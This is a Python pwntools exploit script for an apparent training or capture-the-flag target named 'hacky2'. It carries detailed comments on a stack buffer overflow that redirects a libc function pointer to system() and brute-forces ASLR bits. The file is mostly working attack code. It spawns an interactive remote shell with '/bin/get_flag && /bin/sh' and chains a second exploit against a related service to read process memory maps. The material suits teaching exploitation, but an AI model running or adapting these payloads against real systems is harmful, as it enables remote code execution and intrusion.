#!/usr/bin/python3

#NOTE: The actual exploit with explanation and output functionality is located in teh exploit() 
#      function beginning in line 82.
#NOTE: The get_shell() function from line 299 onwards is a more concise version of the same 
#      exploit, that doesn't provide as much output but spawns a shell in interactive mode in 
#      the end.


#NOTE: CONFIG OPTIONS ARE AVAILABLE HERE:

#Want to enable (more) output? Set one of these options to True.
#  (Those two are partially mutually exclusive in that print_all_flags will prevent continuous
#   plotting of stats during generation. Final stats will still be plotted if both are true.
#   If glitches occur during continuous printing, the True/True combination may still be useful.)
print_stats = True
print_all_flags = False
#How many successfull attempts do you want to use for stat generation?
flag_target = 250
#Want an interactive shell in addition to your flag? Set this to True.
#If set to True the above settings will be ignored.
#Want more output and stats as specified above? Leave it at False.
interactive_shell = False
#If set to true, metainformation about the libc offset (3 constant bits) will be obtained using 
#a pwn07 shell. Otherwise these 3 bit will be chosen at random each iteration.
#Reduces bruteforced bits from 4 to 1
#IMPORTANT NOTE: does not work with arbiter, since seperate connection to pwn07 is required
#                but killed by arbiter in non-relaxed mode => hence defaults to False
obtain_constant_libc_offset = False


#NOTE: Plot dimensions are hardcoded.
#      If glitches occur use a bigger terminal window or make plot smaller using these variables.
#Variables to control plot size for distribution plots
#Number of lines in plot (vertically)
plot_height = 20
#Maximum Number of bars in plot (horizontally)
x_axis_cutoff = 25
#If set to True, cursor will not be moved up to overwrite old ouput when plotting stats.
#May prevent glitches but will print everythin consecutively leading to lots of scrolling...
disable_cursor_reset = False



#import libraries
import sys
import random
import pwn
#get some pwn stuff into global namespace
from pwn import p64,p16
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
pwn.context.log_level = 'error'

#assign host and port to connect to
#via DEFAULTS
host = "hacky2"
port = 13708
port_pwn07 = 13707
#via COMMANDLINE ARGUMENTS
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])
if len(sys.argv) >= 4:
    port_pwn07 = int(sys.argv[3])


#Output formatting stuff
PRINTSET_REDTEXT = "\033[31m"
PRINTSET_GREENTEXT = "\033[32m"
PRINTSET_BOLDTEXT = "\033[1m"
PRINTSET_BLINK = "\033[5m"
PRINTRESET = "\033[0m"

#Stuff needed to check experimentarily how many tries are successfull on average.
attemptcnt_total = 0
attempt_distribution = [0,0]



#ACTUAL EXPLOIT IS LOCATED IN THIS SECTION:
def exploit():
    global attemptcnt_total, attempt_distribution, print_all_flags
    prompt = b"\x1b[36mPlease provide your un-canonicalized file path:\x1b[33m\n"

    attemptcnt_curr = 0
    progress_str=""

    if obtain_constant_libc_offset == True:
        libc_offset_modifier = get_hacky2_libc_constant_bits(host, port_pwn07) * 0x1000
        print("Set additive libc offset modifier: " + hex(libc_offset_modifier) + "\n")

    #This outer loop is only relevant to execute the exploit multiple times 
    #in able to enable statistical evaluation
    for exec_cnt in range(1,flag_target+1):
        #We are employing a bruteforce method using a partial override, that will on average need 
        #  2 tries to obtain a flag (reason see further down).
        #For this we wrap the relevant code in a loop that terminates once a flag is obtained.
        #The actual exploit string can remain static, since the addresses will be different once 
        #  a new connection is established due to ASLR.
        while True:
            if obtain_constant_libc_offset != True:
                libc_offset_modifier = random.randint(0,15) * 0x1000
            #Reestablish the connection. 
            #This will spawn a new instance of vuln on the server with new Address Space Layout.
            proc=pwn.remote(host,port,fam="ipv4")
            #
            #The next line of code is where all (or most of) the magic happens:
            #
            #  35*p64(0x00):
            #    The offset from the beginning of the 'path' buffer on the stack to the return 
            #    address of get_path is 35*8 = 424 bytes long. These are filled up with arbitrary 
            #    bytes. In this case we just use NULL bytes.
            #  p64(0x401483):
            #    The return address of the 'get_path' function is overwritten with an address in 
            #    'main' causing the repeated invokation of the 'get_path' function.
            #    we need to reinvoke the 'get_path' function, since among other things it 
            #    allocates a buffer on the heap to which the content of the buffer on the stack 
            #    is copied.
            #    The address of the buffer on the heap is then placed in the pointer 'path' that 
            #    is local to 'main' and passed to 'get_path' by reference.
            #    This of course also happens during the first invokation of the function, but 
            #    our buffer overflow overwrites the 'path' variable in main, making the buffer 
            #    inaccessible from there.
            #    For our exploit to work we do however need control of the content of the buffer.
            #  2*p64(0x00):
            #    After the return address we enter the stack frame of main and overwrite another 
            #    16 NULL bytes.
            #    This does overwrite the 'path' pointer, but also allows us to reach the struct 
            #    containing the libc addresses.
            #  p16((0x5e50 + libc_offset_modifier) & 0xFFFF: 
            #    [WAS ORIGINALLY: p16(0x5350), SEE UPDATE BELOW]
            #    The first address in the struct is the address of 'canonicalize_file_name', and 
            #    has two very convenient properties for our purposes:
            #     - Firstly the function is called on the path buffer located on the heap. 
            #       So any function we use to replace it with will be called on this buffer.
            #     - Secondly in the libc version running on the server the offset of the 'system' 
            #       function (0x45e50) is very close to that of the 'canonicalize_file_name' 
            #       function (0x46400).
            #    We can overwrite the lowest two bytes of the address of 'canonicalize_file_name' 
            #    with those of the address of 'system', since all the upper bytes of the address 
            #    Due to page allignment lowest bits of each address are not affected by ASLR. Hence 
            #    simply overwriting them will work just fine.
            #    Interestingly, although the pagesize on hacky2 appears to be 4096 bytes according 
            #    to 'getconf PAGESIZE', the libc base address seems to be not just 12- but 15-bit
            #    alligned (aka ends in 0x0000 ord 0x8000). This makes things even easier, since 
            #    we will only overwrite a single randomized bit wenn modifying the address 
            #    match up.
            #    This results in a situation, in which we have to hope for the uppermost bit of  
            #    the lowest byte of the address to be 0 for our exploit to work, resulting in our 
            #    bruteforce technique with a probability of success of 50%.
            #    
            #    We can confirm this by looking at the stats generated by the code further down.
            #    The below plot has been generated using the plot_stats function and closely 
            #    resembles the expected geometric distribution:
            #
            #    Basic Stats:
            #    Flags obtained:            1000
            #    Total attempts needed:     2068
            #    Average attempts per flag: 2.068
            #    Median attempts per flag:  1
            #    
            #    Attempt Distribution:
            #    
            #    y: Number of Runs
            #    ^
            #    |                                              
            #    |    #                                         
            #    |    #                                         
            #    |    #                                         
            #    |    #                                         
            #    |    #                                         
            #    |    #                                         
            #    |    #                                         
            #    |    #                                         
            #    |    #                                         
            #    |    #                                         
            #    |    #   -                                     
            #    |    #   #                                     
            #    |    #   #                                     
            #    |    #   #                                     
            #    |    #   #                                     
            #    |    #   #                                     
            #    |    #   #   #                                 
            #    |    #   #   #   -                             
            #    |    #   #   #   #   -                         
            #    -----|---|---|---|---|---|---|---|---|---,---|--> x: Attempts per flag
            #    x:   1   2   3   4   5   6   7   8   9  10  11 
            #    y: >99 >99 >99  66  43  21  12   4   4   0   1 
            #    
            #  UPDATE 2023-05-08:
            #    It turns out bits 13-15 are indeed constant for all mmap segments across 
            #      processes, as long as the system is running, but they are randomized 
            #      on reboot. (This is due to the AMD processor architecture used for the 
            #      server our target is running on.)
            #    If we had no access to hacky2, even as a different user, we would hence 
            #      have to bruteforce 4 bit. Also simply relying on ASLR to take care of 
            #      randomization during bruteforce will no longer work, since those three 
            #      bits remain the same until the next reboot. Hence a random offset 
            #      affecting those bits is added to the offset each time (0x1000, 0x2000, 
            #      0x3000, ...), discarding any overflow that may occur.
            #    In this scenario we'll now have to bruteforce 4 bit instead of 1. This is the 
            #      new default setting (see CONFIG: obtain_constant_libc_offset).
            #    If on the other hand we have access to hacky2 as a different user (e.g. via 
            #      the pwn07 exploit), we can simply use that to lookup the libc mapping for 
            #      any process of that user and thus obtain the three bits we need. We can 
            #      then use this information to set libc_offset_modifier to the appropriate 
            #      constant and only need to bruteforce the remaining 1 bit. (This is not 
            #      the default, since arbiter will only allow for a single connection and 
            #      hardcoding the constant would mean, that the exploit might no longer work 
            #      after the next server reboot.)
            #    
            #  An example stat plot for the 4 bit bruteforce variant may look as follows:
            #  
            #  Basic Stats:
            #  Flags obtained:            1020
            #  Total attempts needed:     16802
            #  Average attempts per flag: 16.472549019607843
            #  Median attempts per flag:  12
            #  
            #  Attempt Distribution:
            #  
            #  y: Number of Runs
            #  ^
            #  |                                                                                                                          
            #  |    #                                                                                                                     
            #  |    #       .                                                                                                             
            #  |    #   -   #                                                                                                             
            #  |    #   #   #                                                                                                             
            #  |    #   #   #                                                                                                             
            #  |    #   #   #   -                                                                                                         
            #  |    #   #   #   #                                                                                                         
            #  |    #   #   #   #   -                                                                                                     
            #  |    #   #   #   #   #                                                                                                     
            #  |    #   #   #   #   #   #       .                       .               .                                                 
            #  |    #   #   #   #   #   #   -   #                       #       #       #                                                 
            #  |    #   #   #   #   #   #   #   #   :       -           #   .   #       #                                                 
            #  |    #   #   #   #   #   #   #   #   #   #   #   -       #   #   #       #   -                                             
            #  |    #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #       #   #                                             
            #  |    #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   .   #   #       -           -                         
            #  |    #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   -   #           #       -                 
            #  |    #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   -       #   -   #   -       #     
            #  |    #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   :   #     
            #  |    #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   #   # 
            #  -----|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|--> x: Attempts per flag
            #  x:   1   2   3   4   5   6   7   8   9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30 ... (>30)
            #  y:  70  62  64  51  44  39  34  36  31  28  30  27  25  36  29  35  19  36  27  16  20  13  11  20  13  16  13  10  14   7 ... (144)
            #
            proc.sendafter(prompt, 35*p64(0x00) + p64(0x401483) + 2*p64(0x00) + p16((0x5e50 + libc_offset_modifier) & 0xFFFF))
            #
            #We've now set up everything, so that there's a good chance 'system' will be 
            #  called once we reach line 94 of 'main', where 'canonicalize_file_name' was 
            #  supposed to be invoked on whateve the 'path*' pointer points to.
            #Since the second invokation of 'get_path' allocates a new buffer on the heap 
            #  to fulfill this role, all that is left to do is put the string NULL-terminated 
            #  string '/bin/get_flag\x00' in there.
            #    
            proc.sendafter(prompt, b"/bin/get_flag\x00")

            try:
                attemptcnt_curr += 1
                res = proc.readline()
                #If 'flag' is contained within the response, we print it (and some other stuff.
                #Else, rinse and repeat. We'll be lucky at some point. On average every second 
                #attempt (if libc base address bits 13-15 are retrieved) or every 16th attempt 
                #(if random bits are used).
                if b'flag' in res:
                    update_attemptcnt(attemptcnt_curr)
                    if print_all_flags == True:
                        print_flagtext(res.decode(), exec_cnt, attemptcnt_curr)
                    else:
                        if print_all_flags == False and exec_cnt == 1:
                            print_flagtext(res.decode(), exec_cnt, attemptcnt_curr)
                            progress_str = "Generating further stats for analysis (obtaining " + str(flag_target) + " flags):\n"
                            progress_str += "00."
                        elif exec_cnt % 10 == 0:
                            progress_str = "Generating further stats for analysis (obtaining " + str(flag_target) + " flags):\n"
                            progress_str += str(exec_cnt)
                        else:
                            if not print_stats: progress_str = ""
                            progress_str += "."
                        plot_stats(exec_cnt, exec_cnt > 1 and not disable_cursor_reset)
                        print(progress_str)
                    proc.close()
                    break
            except EOFError:
                pass

            proc.close()
        attemptcnt_curr = 0
    plot_stats(flag_target, not disable_cursor_reset)
    print("\n")


#Same exploit as above, but more concise and spawns a shell in interactive mode in the end.
def get_shell():
    prompt = b"\x1b[36mPlease provide your un-canonicalized file path:\x1b[33m\n"
    if obtain_constant_libc_offset == True:
        libc_offset_modifier = get_hacky2_libc_constant_bits(host, port_pwn07) * 0x1000
        print("Set additive libc offset modifier: " + hex(libc_offset_modifier) + "\n")
    while True:
        if obtain_constant_libc_offset != True:
            libc_offset_modifier = random.randint(0,15) * 0x1000
        proc=pwn.remote(host,port,fam="ipv4")
        proc.sendafter(prompt, 35*p64(0x00) + p64(0x401483) + 2*p64(0x00) + p16((0x5e50 + libc_offset_modifier) & 0xFFFF))
        proc.sendafter(prompt, b"/bin/get_flag && /bin/sh\x00")
        try:
            res = proc.readline()
            if b'flag' in res:
                print(res.decode())
                print("Here's your shell:")
                proc.interactive()
                break
        except EOFError:
            pass
        proc.close()

#ACTUAL EXPLOIT SECTION ENDS HERE




#FROM HERE ON ITS JUST FORMATTING STATS

def print_flagtext(flag_str, exec_cnt, attempts_needed):
    print(PRINTSET_BOLDTEXT + "Run #" + str(exec_cnt) + ": " + PRINTRESET, end='')
    print("Obtained flag after " + PRINTSET_REDTEXT + PRINTSET_BOLDTEXT + str(attempts_needed) + PRINTRESET + " attempts:\n", end='')
    print(" > " + (PRINTSET_BLINK if exec_cnt == 1 else "") +PRINTSET_BOLDTEXT + PRINTSET_REDTEXT + flag_str + PRINTRESET)


def update_attemptcnt(attemptcnt_curr):
    global attemptcnt_total
    attemptcnt_total += attemptcnt_curr
    while attemptcnt_curr >= len(attempt_distribution):
        attempt_distribution.append(0)
    attempt_distribution[attemptcnt_curr] += 1


#if print_stats is enabled, we plot the experimentally obtained stability stats of our flag retrieval function
#the code from here on is not atucally relevant for the exploit, but only generates output
def plot_stats(exec_cnt, reset_cursor):
    global print_stats, plot_height, x_axis_cutoff
    if print_stats == True:
        xcnt = len(attempt_distribution)
        xcnt_limited = min(xcnt, x_axis_cutoff + 1)

        if reset_cursor:
            print("\033[38A", end='')

        print("\n")
        print(PRINTSET_BOLDTEXT + "Basic Stats:\n" + PRINTRESET, end='')
        print("Flags obtained:            " + str(exec_cnt))
        print("Total attempts needed:     " + str(attemptcnt_total))    
        print("Average attempts per flag: " + str(attemptcnt_total/exec_cnt)) 

        tmp_sum = 0
        median= 0
        for i in range(0,xcnt):
            tmp_sum += attempt_distribution[i]
            if tmp_sum >= exec_cnt/2: 
                median = i
                break
        print("Median attempts per flag:  " + str(median))

        print(PRINTSET_BOLDTEXT + "\nAttempt Distribution:\n\n" + PRINTRESET, end='')

        most_common_attemptcnt = 0
        for i in range(0,xcnt):
            if attempt_distribution[most_common_attemptcnt] < attempt_distribution[i]:
                most_common_attemptcnt = i
        
        print("y: Number of Runs\n", end='')
        print("^\n", end='')
        for i in range(0,plot_height):
            print("|  ", end='')
            for j in range(1,xcnt_limited):
                if j == most_common_attemptcnt:
                    print(PRINTSET_GREENTEXT, end='')
                else:
                    print(PRINTSET_REDTEXT, end='')
                curr_height = (plot_height*attempt_distribution[j]) / attempt_distribution[most_common_attemptcnt]
                curr_heightdiff = curr_height - (plot_height - i)
                if curr_heightdiff >= 1:
                    print("  # ", end='')
                #unlikely case: close to upper end of current bar
                elif curr_heightdiff >= 0:
                    if curr_heightdiff >= 3/4:
                        print("  : ", end='')
                    elif curr_heightdiff >= 2/4:
                        print("  - ", end='')
                    elif curr_heightdiff >= 1/4:
                        print("  . ", end='')
                    else:
                        print("    ", end='')
                else:
                    print("    ", end='')
            print(PRINTRESET + "\n", end='')
        print("---", end='')
        for j in range(1,xcnt_limited):
            if attempt_distribution[j] > 0:
                print("--|-", end='')
            else:
                print("--,-", end='')
        print("-> x: Attempts per flag\n", end='')
        print("x: ", end='')
        for j in range(1,xcnt_limited):
            if j < 10:
                print("  " + str(j) + " ", end='')
            elif j < 100:
                print(" " + str(j) + " ", end='')
            else:
                print(">99 ", end='')
        if xcnt_limited < xcnt:
            print("... (>" + str(xcnt_limited - 1) + ")", end='')
        print("\n", end='')
        print("y: ", end='')
        for j in range(1,xcnt_limited):
            if attempt_distribution[j] < 10:
                print("  " + str(attempt_distribution[j]) + " ", end='')
            elif attempt_distribution[j] < 100:
                print(" " + str(attempt_distribution[j]) + " ", end='')
            else:
                print(">99 ", end='')
        if xcnt_limited < xcnt:
            print("... (" + str(sum(attempt_distribution[xcnt_limited:])) + ")", end='')
        print("\n")


def get_hacky2_pwn07_shell(pwn07_host, pwn07_port):
    #slightly modified code from pwn07 exploit
    print("Setting up connection with pwn07@hacky2 to obtain libc constant address bits (13-15).")
    proc_pwn07=pwn.remote(pwn07_host,pwn07_port,fam="ipv4")
    proc_pwn07.write(b"0\n1073741828\n0\n4\n1\n1\n8\n9\n4208392\n2\n1\n6\n7\n")
    proc_pwn07.readuntil(b"0x")
    tmp_str = proc_pwn07.readline()
    libc_system_addr_lower = int(tmp_str[0:len(tmp_str)-8], 16) - 0x53cf0 + 0x45e50
    proc_pwn07.write(b"1\n1\n18\n19\n" + str(libc_system_addr_lower).encode() + b"\n/bin/get_flag && /bin/sh\n")
    proc_pwn07.readuntil(b"flag_")
    proc_pwn07.readline()
    proc_pwn07.clean()
    return proc_pwn07


def get_hacky2_libc_constant_bits(pwn07_host, pwn07_port):
    proc_pwn07 = get_hacky2_pwn07_shell(pwn07_host, pwn07_port)
    proc_pwn07.clean()
    proc_pwn07.write(b"cat /proc/$$/maps | grep libc | grep 00000000\n")
    libc_base_mapping = proc_pwn07.readline()
    libc_constant_bits = int(libc_base_mapping[8:9], 16) & 0x7
    proc_pwn07.close()
    print("Obtained libc constant address bits (13-15) form hacky2: " + hex(libc_constant_bits))
    return libc_constant_bits



if interactive_shell != True:
    exploit()
else:
    get_shell()

